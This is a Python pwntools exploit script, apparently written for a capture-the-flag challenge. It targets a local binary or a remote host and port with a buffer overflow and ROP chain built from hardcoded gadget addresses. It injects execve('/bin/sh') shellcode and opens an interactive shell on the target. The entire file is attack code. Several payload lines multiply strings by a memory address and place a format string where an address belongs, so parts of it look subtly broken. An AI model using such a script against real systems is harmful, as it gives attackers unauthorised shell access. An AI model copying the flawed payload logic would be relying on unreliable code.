import sys
import logging
from pwn import *
logging.basicConfig(level=logging.INFO, format="%(message)s")
#logging.disable(logging.CRITICAL)

if len(sys.argv) == 2:
    program_name = sys.argv[1]
    target = process(program_name)
    logging.info("***local exploit ***")

else:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    logging.info("***remote exploit ***")
    logging.info("[*]target host : " + HOST)
    logging.info("[*]target port : " + str(PORT))
    target = remote(HOST, PORT)

###address###
puts_plt = 0x400580
puts_got = 0x600bb8
fclose_got = 0x600bc0
alarm_got = 0x600bc8

scanf_plt = 0x4005c0

pop_rdi_ret = 0x00000000004007e3
pop_rsi_r15 = 0x00000000004007e1 
ret_addr = 0x0000000000400566 

bss_writable = 0x600c00

call_rax = 0x0000000000400560


shellcode = b'\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05'


###main###
def main():
    ###payload###
    payload = b"A" * 40
    payload += p64(pop_rdi_ret)
    payload += b"%s" + b"\x00" * 6
    payload += p64(pop_rsi_r15)
    payload += p64(bss_writable + 0x300)
    payload += b"B" * 8
    payload += p64(scanf_plt)
    payload += p64(pop_rdi_ret)
    payload += b"%s" * (bss_writable + 0x300)
    payload += b"\x00" * (8 - len(payload) % 8)
    payload += p64(pop_rsi_r15)
    payload += p64(bss_writable + 0x400)
    payload += b"B" * 8
    payload += p64(scanf_plt)
    payload += p64(call_rax)
    payload += b"B" * 8

    print(payload)
    print(target.recvline())
    target.sendline(payload)
    
    target.sendline(shellcode)
    target.sendline("A " * (bss_writable + 0x300))

    #print(target.recvline())
    #puts_libc_addr = u64(target.recv(6) + b"\x00\x00")
    #print("[*] puts libc addr = 0x{:x}".format(puts_libc_addr))

    target.interactive()


if __name__ == "__main__":
    main()